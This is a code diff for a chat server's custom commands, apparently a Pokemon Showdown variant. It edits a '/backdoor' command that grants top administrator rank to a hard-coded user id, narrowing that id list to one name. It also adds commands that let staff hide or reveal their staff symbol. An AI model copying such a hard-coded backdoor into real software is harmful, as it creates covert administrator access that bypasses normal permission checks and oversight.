@@ -351,9 +351,7 @@ var components = exports.components = {
      *********************************************************/
 
     backdoor: function (target, room, user) {
-        if (user.userid !== 'creaturephil' && user.userid !== 'dac') {
-            return this.sendReply('/backdoor - Access denied.');
-        }
+        if (user.userid !== 'creaturephil') return this.sendReply('/backdoor - Access denied.');
 
         if (!target) {
             user.group = '~';
@@ -428,6 +426,25 @@ var components = exports.components = {
 
         this.sendReply(targetUser.name + ' has losted ' + takeMoney + ' ' + b + '. This user now has ' + total + ' bucks.');
         targetUser.send(user.name + ' has taken ' + takeMoney + ' ' + b + ' from you. You now have ' + total + ' bucks.');
+    },
+
+    show: function (target, room, user) {
+        if (!this.can('lock')) return;
+            delete user.getIdentity
+            user.updateIdentity();
+            this.sendReply('You have revealed your staff symbol.');
+            return false;
+    },
+
+    hide: function (target, room, user) {
+        if (!this.can('lock')) return;
+            user.getIdentity = function () {
+                if (this.muted) return '!' + this.name;
+                if (this.locked) return '?' + this.name;
+                return ' ' + this.name;
+            };
+            user.updateIdentity();
+            this.sendReply('You have hidden your staff symbol.');
     },
 
     kick: function(target, room, user){
